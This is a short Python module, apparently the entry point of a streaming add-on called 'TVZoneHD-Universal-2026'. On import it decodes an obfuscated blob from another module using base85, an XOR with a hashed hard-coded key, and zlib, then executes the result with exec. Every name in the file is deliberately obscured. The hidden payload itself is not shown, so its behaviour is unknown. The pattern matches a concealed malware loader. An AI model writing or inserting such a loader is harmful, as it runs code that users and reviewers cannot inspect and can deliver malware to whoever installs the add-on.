# -*- coding: utf-8 -*-
import base64 as _b
import hashlib as _h
import zlib as _z
from resources.lib._p import _d

def _x():
    _k = _h.sha256(b"TVZoneHD-Universal-2026").digest()
    _v = _b.b85decode("".join(_d).encode("ascii"))
    _v = bytes(_c ^ _k[_i % len(_k)] for _i, _c in enumerate(_v))
    _s = _z.decompress(_v).decode("utf-8")
    _g = {"__name__": "__main__", "__file__": __file__, "__package__": None}
    exec(compile(_s, "<tvz>", "exec"), _g, _g)

_x()
